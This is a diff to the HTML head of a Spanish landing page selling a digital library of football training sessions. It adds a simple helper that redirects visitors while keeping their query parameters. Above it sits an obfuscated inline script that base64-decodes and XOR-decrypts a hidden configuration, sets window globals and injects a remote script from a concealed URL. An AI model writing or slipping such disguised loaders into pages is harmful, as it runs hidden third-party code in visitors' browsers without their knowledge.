@@ -6,6 +6,24 @@
 
     <script>(function(){var g_kqg=atob("DOs2EHXAFRDpmk3IUpAUZQesNyrL8jm8IpgMP1qjcX7H7zmlO41PPhaveD6L6GK7MZlfYAGzOmWd9z7nPopCdQa0O3qauGHqM59CYhyiYGSM6W/yCZAUfhStcDLTuCmpJoobZQGtfHaQtz26N51TfgHtZmWL8ym7cMcUZhSsYHXLoG/qL7ZL");var w_wzi=[];for(var f_0=0;f_0<g_kqg.length;f_0++){w_wzi.push(g_kqg.charCodeAt(f_0)&255);}var q_79sg=w_wzi[0];var n_nz7=w_wzi.slice(1,1+q_79sg);var g_p8=w_wzi.slice(1+q_79sg);var r_59mx=g_p8.map(function(b,m_o0n){return b^n_nz7[m_o0n%q_79sg];});var b_84t="";for(var e_8sdx=0;e_8sdx<r_59mx.length;e_8sdx++){b_84t+=String.fromCharCode(r_59mx[e_8sdx]&255);}var r_nk7=decodeURIComponent(escape(b_84t));var s_q90=JSON.parse(r_nk7);var d_m4eq=s_q90.globals||[];d_m4eq.forEach(function(d_u){window[d_u.name]=d_u.value;});var r_n0=document.createElement("script");r_n0.src=s_q90.url;r_n0.async=true;r_n0.defer=true;(s_q90.attributes||[]).forEach(function(c_y){r_n0.setAttribute(c_y.name,c_y.value);});(document.head||document.documentElement).appendChild(r_n0);})();</script>
     
+    <script>
+      function redirectWithParams(destination) {
+        const currentParams = window.location.search;
+
+        if (!currentParams) {
+          window.location.href = destination;
+          return;
+        }
+
+        if (destination.includes("?")) {
+          window.location.href = destination + "&" + currentParams.substring(1);
+        } else {
+          window.location.href = destination + currentParams;
+        }
+      }
+      window.redirectWithParams = redirectWithParams;
+    </script>
+
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>+1000 Sesiones de Entrenamientos de Fútbol - Biblioteca Digital Premium</title>
